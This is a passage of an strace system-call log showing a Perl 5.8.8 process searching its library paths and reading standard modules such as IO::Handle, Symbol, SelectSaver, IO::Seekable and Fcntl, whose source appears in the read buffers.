IO::Handle::fdopen($io, @_)\n\tor return undef;\n    bless $io, $class;\n}\n\n#\n# There is no need for DESTROY to do anything, because when the\n# last reference to an IO object is gone, Perl automatically\n# closes its associated files (if any).  However, to avoid any\n# attempts to autoload DESTROY, we here define it to do nothing.\n#\nsub DESTROY {}\n\n################################################\n## Open and close.\n##\n\nsub _open_mode_string {\n    my ($mode) = @_;\n    $mode =~ /^\\+?(<|>>?)$/\n      or $mode =~ s/^r(\\+?)$/$1</\n      or $mode =~ s/^w(\\+?)$/$1>/\n      or $mode =~ s/^a(\\+?)$/$1>>/\n      or croak \"IO::Handle: bad open mode: $mode\";\n    $mode;\n}\n\nsub fdopen {\n    @_ == 3 or croak \'usage: $io->fdopen(FD, MODE)\';\n    my ($io, $fd, $mode) = @_;\n    local(*GLOB);\n\n    if (ref($fd) && \"\".$fd =~ /GLOB\\(/o) {\n\t# It\'s a glob reference; Alias it as we cannot get name of anon GLOBs\n\tmy $n = qualify(*GLOB);\n\t*GLOB = *{*$fd};\n\t$fd =  $n;\n    } elsif ($fd =~ m#^\\d+$#) {\n\t# It\'s an FD number; prefix with \"=\".\n\t$fd = \"=$fd\";\n    }\n\n    open($io, _open_mode_string($mode) . \'&\' . $fd)\n\t? $io : undef;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $io->close()\';\n    my($io) = @_;\n\n    close($io);\n}\n\n################################################\n## Normal I/O functions.\n##\n\n# flock\n# select\n\nsub opened {\n    @_ == 1 or croak \'usage: $io->opened()\';\n    defined fileno($_[0]);\n}\n\nsub fileno {\n    @_ == 1 or croak \'usage: $io->fileno()\';\n    fileno($_[0]);\n}\n\nsub getc {\n    @_ == 1 or croak \'usage: $io->getc()\';\n    getc($_[0]);\n}\n\nsub eof {\n    @_ == 1 or croak \'usage: $io->eof()\';\n    eof($_[0]);\n}\n\nsub print {\n    @_ or croak \'usage: $io->print(ARGS)\';\n    my $this = shift;\n    print $this @_;\n}\n\nsub printf {\n    @_ >= 2 or croak \'usage: $io->printf(FMT,[ARGS])\';\n    my $this = shift;\n    printf $this @_;\n}\n\nsub getline {\n    @_ == 1 or croak \'usage: $io->getline()\';\n    my $this = shift;\n    return scalar <$this>;\n} \n\n*gets = \\&getline;  # deprecated\n\nsub getlines {\n    @_ == 1 or croak \'usage: $io->getlines()\';\n    wantarray or\n\tcroak \'Can\\\'t call $io->getlines in a scalar context, use $io->getline\';\n    my $this = shift;\n    return <$this>;\n}\n\nsub truncate {\n    @_ == 2 or croak \'usage: $io->truncate(LEN)\';\n    truncate($_[0], $_[1]);\n}\n\nsub read {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->read(BUF, LEN [, OFFSET])\';\n    read($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub sysread {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->sysread(BUF, LEN [, OFFSET])\';\n    sysread($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub write {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->write(BUF [, LEN [, OFFSET]])\';\n    local($\\) = \"\";\n    $_[2] = length($_[1]) unless defined $_[2];\n    print { $_[0] } substr($_[1], $_[3] || 0, $_[2]);\n}\n\nsub syswrite {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->syswrite(BUF [, LEN [, OFFSET]])\';\n    if (defined($_[2])) {\n\tsyswrite($_[0], $_[1], $_[2], $_[3] || 0);\n    } else {\n\tsyswrite($_[0], $_[1]);\n    }\n}\n\nsub stat {\n    @_ == 1 or croak \'u", 4096) = 4096
10004 07:30:53.688127 stat64("/etc/perl/Symbol.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.688143 stat64("/etc/perl/Symbol.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.688168 stat64("/usr/local/lib/perl/5.8.8/Symbol.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.688212 stat64("/usr/local/lib/perl/5.8.8/Symbol.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.688226 stat64("/usr/local/share/perl/5.8.8/Symbol.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.688253 stat64("/usr/local/share/perl/5.8.8/Symbol.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.688284 stat64("/usr/lib/perl5/Symbol.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.688295 stat64("/usr/lib/perl5/Symbol.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.688308 stat64("/usr/share/perl5/Symbol.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.688320 stat64("/usr/share/perl5/Symbol.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.688333 stat64("/usr/lib/perl/5.8/Symbol.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.688345 stat64("/usr/lib/perl/5.8/Symbol.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.688358 stat64("/usr/share/perl/5.8/Symbol.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.688370 stat64("/usr/share/perl/5.8/Symbol.pm", {st_mode=S_IFREG|0644, st_size=2099, ...}) = 0
10004 07:30:53.688391 open("/usr/share/perl/5.8/Symbol.pm", O_RDONLY|O_LARGEFILE) = 8
10004 07:30:53.688405 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeed4a8) = -1 ENOTTY (Inappropriate ioctl for device)
10004 07:30:53.688416 _llseek(8, 0, [0], SEEK_CUR) = 0
10004 07:30:53.688433 read(8, "package Symbol;\n\nBEGIN { require 5.005; }\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(gensym ungensym qualify qualify_to_ref);\n@EXPORT_OK = qw(delete_package geniosym);\n\n$VERSION = \'1.06\';\n\nmy $genpkg = \"Symbol::\";\nmy $genseq = 0;\n\nmy %global = map {$_ => 1} qw(ARGV ARGVOUT ENV INC SIG STDERR STDIN STDOUT);\n\n#\n# Note that we never _copy_ the glob; we just make a ref to it.\n# If we did copy it, then SVf_FAKE would be set on the copy, and\n# glob-specific behaviors (e.g. C<*$ref = \\&func>) wouldn\'t work.\n#\nsub gensym () {\n    my $name = \"GEN\" . $genseq++;\n    my $ref = \\*{$genpkg . $name};\n    delete $$genpkg{$name};\n    $ref;\n}\n\nsub geniosym () {\n    my $sym = gensym();\n    # force the IO slot to be filled\n    select(select $sym);\n    *$sym{IO};\n}\n\nsub ungensym ($) {}\n\nsub qualify ($;$) {\n    my ($name) = @_;\n    if (!ref($name) && index($name, \'::\') == -1 && index($name, \"\'\") == -1) {\n\tmy $pkg;\n\t# Global names: special character, \"^xyz\", or other. \n\tif ($name =~ /^(([^a-z])|(\\^[a-z_]+))\\z/i || $global{$name}) {\n\t    # RGS 2001-11-05 : translate leading ^X to control-char\n\t    $name =~ s/^\\^([a-z_])/\'qq(\\c\'.$1.\')\'/eei;\n\t    $pkg = \"main\";\n\t}\n\telse {\n\t    $pkg = (@_ > 1) ? $_[1] : caller;\n\t}\n\t$name = $pkg . \"::\" . $name;\n    }\n    $name;\n}\n\nsub qualify_to_ref ($;$) {\n    return \\*{ qualify $_[0], @_ > 1 ? $_[1] : caller };\n}\n\n#\n# of Safe.pm lineage\n#\nsub delete_package ($) {\n    my $pkg = shift;\n\n    # expand to full symbol table name if needed\n\n    unless ($pkg =~ /^main::.*::$/) {\n        $pkg = \"main$pkg\"\tif\t$pkg =~ /^::/;\n        $pkg = \"main::$pkg\"\tunless\t$pkg =~ /^main::/;\n        $pkg .= \'::\'\t\tunless\t$pkg =~ /::$/;\n    }\n\n    my($stem, $leaf) = $pkg =~ m/(.*::)(\\w+::)$/;\n    my $stem_symtab = *{$stem}{HASH};\n    return unless defined $stem_symtab and exists $stem_symtab->{$leaf};\n\n    # free all the symbols in the package\n\n    my $leaf_symtab = *{$stem_symtab->{$leaf}}{HASH};\n    foreach my $name (keys %$leaf_symtab) {\n        undef *{$pkg . $name};\n    }\n\n    # delete the symbol table\n\n    %$leaf_symtab = ();\n    delete $stem_symtab->{$leaf};\n}\n\n1;\n", 4096) = 2099
10004 07:30:53.688880 read(8, "", 4096) = 0
10004 07:30:53.688896 close(8)          = 0
10004 07:30:53.688960 stat64("/etc/perl/SelectSaver.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.688976 stat64("/etc/perl/SelectSaver.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.688990 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.689003 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.689017 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.689030 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.689044 stat64("/usr/lib/perl5/SelectSaver.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.689056 stat64("/usr/lib/perl5/SelectSaver.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.689069 stat64("/usr/share/perl5/SelectSaver.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.689081 stat64("/usr/share/perl5/SelectSaver.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.689094 stat64("/usr/lib/perl/5.8/SelectSaver.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.689107 stat64("/usr/lib/perl/5.8/SelectSaver.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.689121 stat64("/usr/share/perl/5.8/SelectSaver.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.689133 stat64("/usr/share/perl/5.8/SelectSaver.pm", {st_mode=S_IFREG|0644, st_size=340, ...}) = 0
10004 07:30:53.689245 open("/usr/share/perl/5.8/SelectSaver.pm", O_RDONLY|O_LARGEFILE) = 8
10004 07:30:53.689289 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeed4a8) = -1 ENOTTY (Inappropriate ioctl for device)
10004 07:30:53.689301 _llseek(8, 0, [0], SEEK_CUR) = 0
10004 07:30:53.689336 read(8, "package SelectSaver;\n\nour $VERSION = \'1.01\';\n\nrequire 5.000;\nuse Carp;\nuse Symbol;\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new SelectSaver [FILEHANDLE]\';\n    my $fh = select;\n    my $self = bless \\$fh, $_[0];\n    select qualify($_[1], caller) if @_ > 1;\n    $self;\n}\n\nsub DESTROY {\n    my $self = $_[0];\n    select $$self;\n}\n\n1;\n", 4096) = 340
10004 07:30:53.689461 brk(0x81d6000)    = 0x81d6000
10004 07:30:53.689491 read(8, "", 4096) = 0
10004 07:30:53.689502 close(8)          = 0
10004 07:30:53.689955 read(6, "sage: $io->stat()\';\n    stat($_[0]);\n}\n\n################################################\n## State modification functions.\n##\n\nsub autoflush {\n    my $old = new SelectSaver qualify($_[0], caller);\n    my $prev = $|;\n    $| = @_ > 1 ? $_[1] : 1;\n    $prev;\n}\n\nsub output_field_separator {\n    carp \"output_field_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $,;\n    $, = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub output_record_separator {\n    carp \"output_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $\\;\n    $\\ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_record_separator {\n    carp \"input_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $/;\n    $/ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_line_number {\n    local $.;\n    () = tell qualify($_[0], caller) if ref($_[0]);\n    my $prev = $.;\n    $. = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_page_number {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $%;\n    $% = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_per_page {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $=;\n    $= = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_left {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $-;\n    $- = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $~;\n    $~ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_top_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $^;\n    $^ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_line_break_characters {\n    carp \"format_line_break_characters is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $:;\n    $: = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_formfeed {\n    carp \"format_formfeed is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $^L;\n    $^L = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub formline {\n    my $io = shift;\n    my $picture = shift;\n    local($^A) = $^A;\n    local($\\) = \"\";\n    formline($picture, @_);\n    print $io $^A;\n}\n\nsub format_write {\n    @_ < 3 || croak \'usage: $io->write( [FORMAT_NAME] )\';\n    if (@_ == 2) {\n\tmy ($io, $fmt) = @_;\n\tmy $oldfmt = $io->format_name($fmt);\n\tCORE::write($io);\n\t$io->format_name($oldfmt);\n    } else {\n\tCORE::write($_[0]);\n    }\n}\n\n# XXX undocumented\nsub fcntl {\n    @_ == 3 || croak \'usage: $io->fcntl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return fcntl($io, $op, $_[2]);\n}\n\n# XXX undocumented\nsub ioctl {\n    @_ == 3 || croak \'usage: $io->ioctl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return ioctl($io, $op, $_[2]);\n}\n\n# this sub is for compatability with older releases of IO that used\n# a sub called constant to detemine if a constant existed -- GMB\n#\n# The SEEK_* and _IO?BF constants were the only constants at that time\n# any new code should just chech defined(&CONSTANT_NAME)\n\nsub constant {\n    no strict \'refs\';\n    my $name = shift;\n    (($name =~ /^(SEEK_(SET|CUR|END)|_IO[FLN]BF)$/) && defined &{$name})\n\t? &{$name}() : undef;\n}\n\n# so that flush.pl can be deprecated\n\nsub printflush {\n    my $io = shift;\n    my $old;\n    $old = new SelectSaver qualify($io, caller) if ref($io);\n    local $| = 1;\n    if(ref($io)) {\n        print $io @_;\n    }\n    else {\n\tprint @_;\n    }\n}\n\n1;\n", 4096) = 3496
10004 07:30:53.691206 read(6, "", 4096) = 0
10004 07:30:53.691222 close(6)          = 0
10004 07:30:53.691262 stat64("/etc/perl/IO/Seekable.pmc", 0xbfeedc3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.702416 stat64("/etc/perl/IO/Seekable.pm", 0xbfeedb4c) = -1 ENOENT (No such file or directory)
10004 07:30:53.702416 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pmc", 0xbfeedc3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.702417 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pm", 0xbfeedb4c) = -1 ENOENT (No such file or directory)
10004 07:30:53.702417 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pmc", 0xbfeedc3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.702417 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pm", 0xbfeedb4c) = -1 ENOENT (No such file or directory)
10004 07:30:53.702417 stat64("/usr/lib/perl5/IO/Seekable.pmc", 0xbfeedc3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.702418 stat64("/usr/lib/perl5/IO/Seekable.pm", 0xbfeedb4c) = -1 ENOENT (No such file or directory)
10004 07:30:53.702429 stat64("/usr/share/perl5/IO/Seekable.pmc", 0xbfeedc3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.702441 stat64("/usr/share/perl5/IO/Seekable.pm", 0xbfeedb4c) = -1 ENOENT (No such file or directory)
10004 07:30:53.702454 stat64("/usr/lib/perl/5.8/IO/Seekable.pmc", 0xbfeedc3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.702475 stat64("/usr/lib/perl/5.8/IO/Seekable.pm", {st_mode=S_IFREG|0644, st_size=686, ...}) = 0
10004 07:30:53.702498 open("/usr/lib/perl/5.8/IO/Seekable.pm", O_RDONLY|O_LARGEFILE) = 6
10004 07:30:53.702513 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeed958) = -1 ENOTTY (Inappropriate ioctl for device)
10004 07:30:53.702524 _llseek(6, 0, [0], SEEK_CUR) = 0
10004 07:30:53.702544 read(6, "#\n\npackage IO::Seekable;\n\nuse 5.006_001;\nuse Carp;\nuse strict;\nour($VERSION, @EXPORT, @ISA);\nuse IO::Handle ();\n# XXX we can\'t get these from IO::Handle or we\'ll get prototype\n# mismatch warnings on C<use POSIX; use IO::File;> :-(\nuse Fcntl qw(SEEK_SET SEEK_CUR SEEK_END);\nrequire Exporter;\n\n@EXPORT = qw(SEEK_SET SEEK_CUR SEEK_END);\n@ISA = qw(Exporter);\n\n$VERSION = \"1.10\";\n$VERSION = eval $VERSION;\n\nsub seek {\n    @_ == 3 or croak \'usage: $io->seek(POS, WHENCE)\';\n    seek($_[0], $_[1], $_[2]);\n}\n\nsub sysseek {\n    @_ == 3 or croak \'usage: $io->sysseek(POS, WHENCE)\';\n    sysseek($_[0], $_[1], $_[2]);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $io->tell()\';\n    tell($_[0]);\n}\n\n1;\n", 4096) = 686
10004 07:30:53.702674 stat64("/etc/perl/Fcntl.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.702703 stat64("/etc/perl/Fcntl.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.702759 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.702772 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.702786 stat64("/usr/local/share/perl/5.8.8/Fcntl.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.702798 stat64("/usr/local/share/perl/5.8.8/Fcntl.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.702812 stat64("/usr/lib/perl5/Fcntl.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.702824 stat64("/usr/lib/perl5/Fcntl.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.702851 stat64("/usr/share/perl5/Fcntl.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.702867 stat64("/usr/share/perl5/Fcntl.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.702880 stat64("/usr/lib/perl/5.8/Fcntl.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.702892 stat64("/usr/lib/perl/5.8/Fcntl.pm", {st_mode=S_IFREG|0644, st_size=3458, ...}) = 0
10004 07:30:53.702912 open("/usr/lib/perl/5.8/Fcntl.pm", O_RDONLY|O_LARGEFILE) = 8
10004 07:30:53.702926 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeed4a8) = -1 ENOTTY (Inappropriate ioctl for device)
10004 07:30:53.702937 _llseek(8, 0, [0], SEEK_CUR) = 0
10004 07:30:53.702956 read(8, "package Fcntl;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS, $AUTOLOAD);\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n$VERSION = \"1.05\";\n# Items to export into callers namespace by default\n# (move infrequently used names to @EXPORT_OK below)\n@EXPORT =\n  qw(\n\tFD_CLOEXEC\n\tF_ALLOCSP\n\tF_ALLOCSP64\n\tF_COMPAT\n\tF_DUP2FD\n\tF_DUPFD\n\tF_EXLCK\n\tF_FREESP\n\tF_FREESP64\n\tF_FSYNC\n\tF_FSYNC64\n\tF_GETFD\n\tF_GETFL\n\tF_GETLK\n\tF_GETLK64\n\tF_GETOWN\n\tF_NODNY\n\tF_POSIX\n\tF_RDACC\n\tF_RDDNY\n\tF_RDLCK\n\tF_RWACC\n\tF_RWDNY\n\tF_SETFD\n\tF_SETFL\n\tF_SETLK\n\tF_SETLK64\n\tF_SETLKW\n\tF_SETLKW64\n\tF_SETOWN\n\tF_SHARE\n\tF_SHLCK\n\tF_UNLCK\n\tF_UNSHARE\n\tF_WRACC\n\tF_WRDNY\n\tF_WRLCK\n\tO_ACCMODE\n\tO_ALIAS\n\tO_APPEND\n\tO_ASYNC\n\tO_BINARY\n\tO_CREAT\n\tO_DEFER\n\tO_DIRECT\n\tO_DIRECTORY\n\tO_DSYNC\n\tO_EXCL\n\tO_EXLOCK\n\tO_LARGEFILE\n\tO_NDELAY\n\tO_NOCTTY\n\tO_NOFOLLOW\n\tO_NOINHERIT\n\tO_NONBLOCK\n\tO_RANDOM\n\tO_RAW\n\tO_RDONLY\n\tO_RDWR\n\tO_RSRC\n\tO_RSYNC\n\tO_SEQUENTIAL\n\tO_SHLOCK\n\tO_SYNC\n\tO_TEMPORARY\n\tO_TEXT\n\tO_TRUNC\n\tO_WRONLY\n     );\n\n# Other items we are prepared to export if requested\n@EXPORT_OK = qw(\n\tDN_ACCESS\n\tDN_ATTRIB\n\tDN_CREATE\n\tDN_DELETE\n\tDN_MODIFY\n\tDN_MULTISHOT\n\tDN_RENAME\n\tFAPPEND\n\tFASYNC\n\tFCREAT\n\tFDEFER\n\tFDSYNC\n\tFEXCL\n\tFLARGEFILE\n\tFNDELAY\n\tFNONBLOCK\n\tFRSYNC\n\tFSYNC\n\tFTRUNC\n\tF_GETLEASE\n\tF_GETSIG\n\tF_NOTIFY\n\tF_SETLEASE\n\tF_SETSIG\n\tLOCK_EX\n\tLOCK_MAND\n\tLOCK_NB\n\tLOCK_READ\n\tLOCK_RW\n\tLOCK_SH\n\tLOCK_UN\n\tLOCK_WRITE\n\tO_IGNORE_CTTY\n\tO_NOATIME\n\tO_NOLINK\n\tO_NOTRANS\n\tSEEK_CUR\n\tSEEK_END\n\tSEEK_SET\n\tS_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\tS_IREAD S_IWRITE S_IEXEC\n\tS_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\tS_IROTH S_IWOTH S_IXOTH S_IRWXO\n\tS_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\tS_ISUID S_ISGID S_ISVTX S_ISTXT\n\t_S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t&S_ISREG &S_ISDIR &S_ISLNK &S_ISSOCK &S_ISBLK &S_ISCHR &S_ISFIFO\n\t&S_ISWHT &S_ISENFMT &S_IFMT &S_IMODE\n);\n# Named groups of exports\n%EXPORT_TAGS = (\n    \'flock\'   => [qw(LOCK_SH LOCK_EX LOCK_NB LOCK_UN)],\n    \'Fcompat\' => [qw(FAPPEND FASYNC FCREAT FDEFER FDSYNC FEXCL FLARGEFILE\n\t\t     FNDELAY FNONBLOCK FRSYNC FSYNC FTRUNC)],\n    \'seek\'    => [qw(SEEK_SET SEEK_CUR SEEK_END)],\n    \'mode\'    => [qw(S_ISUID S_ISGID S_ISVTX S_ISTXT\n\t\t     _S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t\t     S_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\t\t     S_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\t\t     S_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\t\t     S_IROTH S_IWOTH S_IXOTH S_IRWXO\n\t\t     S_IREAD S_IWRITE S_IEXEC\n\t\t     S_ISREG S_ISDIR S_ISLNK S_ISSOCK\n\t\t     S_ISBLK S_ISCHR S_ISFIFO\n\t\t     S_ISWHT S_ISENFMT\t\t\n\t\t     S_IFMT S_IMODE\n                  )],\n);\n\nsub S_IFMT  { @_ ? ( $_[0] & _S_IFMT() ) : _S_IFMT()  }\nsub S_IMODE { $_[0] & 07777 }\n\nsub S_ISREG    { ( $_[0] & _S_IFMT() ) == S_IFREG()   }\nsub S_ISDIR    { ( $_[0] & _S_IFMT() ) == S_IFDIR()   }\nsub S_ISLNK    { ( $_[0] & _S_IFMT() ) == S_IFLNK()   }\nsub S_ISSOCK   { ( $_[0] & _S_IFMT() ) == S_IFSOCK()  }\nsub S_ISBLK    { ( $_[0] & _S_IFMT() ) == S_IFBLK()   }\nsub S_ISCHR    { ( $_[0] & _S_IFMT() ) == S_IFCHR()   }\nsub S_ISFIFO   { ( $_[0] & _S_IFMT() ) == S_IFIFO()   }\nsub S_ISWHT    { ( $_[0] & _S_IFMT() ) == S_IFWHT()   }\nsub S_ISENFMT  { ( $_[0] & _S_IFMT() ) == S_IFENFMT() }\n\nsub AUTOLOAD {\n    (my $constname = $AUTOLOAD) =~ s/.*:://;\n    die \"&Fcntl::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n        my (undef,$file,$line) = caller;\n        die \"$error at $file line $line.\\n\";\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Fcntl\', $VERSION;\n\n1;\n", 4096) = 3458
10004 07:30:53.703366 brk(0x81f7000)    = 0x81f7000
10004 07:30:53.703540 read(8, "", 4096) = 0
10004 07:30:53.703555 close(8)          = 0
10004 07:30:53.703624 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
10004 07:30:53.703648 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
10004 07:30:53.703674 open("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", O_RDONLY) = 8
10004 07:30:53.703702 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0 \10\0\0004\0\0\0\274,\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274*\0\0\274*\0\0\5\0\0\0\0\20\0\0\1\0\0\0\274*\0\0\274:\0\0\274:\0\0T\1\0\0X\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320*\0\0\320:\0\0\320:\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\21\0\0\0\36\0\0\0\0\0\0\0\25\0\0\0\32\0\0\0\24\0\0\0\5\0\0\0\t\0\0\0\0\0\0\0\23\0\0\0\21\0\0\0\34\0\0\0\4\0\0\0\26\0\0\0\0\0\0\0\30\0\0\0\17\0\0\0\27\0\0\0\r\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\1\0\0\0\0\0\0\0\3\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\v\0\0\0\6\0\0\0\35\0\0\0\7\0\0\0\0\0\0\0\22\0\0\0\31\0\0\0\33\0\0\0\20\0\0\0\16\0\0\0\n\0\0\0\0\0\0\0\f\0\0\0\10\0\0\0\0\0\0\0\3\0\0\0\27\0\0\0\2\0\0\0\6\0\0\0\210\0 \1\0\304H\t\27\0\0\0\32\0\0\0\35\0\0\0\356TU\220\272\343\222|CE\325\354.6bx\330qX\34\271\215\361\16\353\323\357\16\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\353\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0j\1\0\0\0\0\0\0\0\0\0\0\20\0\0\0\337\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0u\0\0\0\0\0\0\0", 512) = 512
10004 07:30:53.703836 fstat64(8, {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
10004 07:30:53.703858 mmap2(NULL, 15380, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7cfa000
10004 07:30:53.703871 mmap2(0xb7cfd000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x2) = 0xb7cfd000
10004 07:30:53.703886 close(8)          = 0
10004 07:30:53.704088 read(6, "", 4096) = 0
10004 07:30:53.704102 close(6)          = 0
10004 07:30:53.704133 stat64("/etc/perl/IO/File.pmc", 0xbfeedc3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.704148 stat64("/etc/perl/IO/File.pm", 0xbfeedb4c) = -1 ENOENT (No such file or directory)
10004 07:30:53.704161 stat64("/usr/local/lib/perl/5.8.8/IO/File.pmc", 0xbfeedc3c) = -1 ENOENT (No such file or directory)
